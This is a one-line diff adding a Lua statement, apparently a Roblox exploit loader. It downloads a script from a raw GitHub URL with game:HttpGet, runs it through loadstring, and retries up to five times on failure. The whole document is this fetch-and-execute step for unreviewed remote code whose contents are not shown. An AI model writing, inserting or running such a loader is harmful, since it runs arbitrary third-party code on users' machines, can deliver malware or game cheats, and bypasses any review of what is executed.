@@ -1,0 +1,1 @@
+local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/sab"))()end)if s then break end wait(5)end
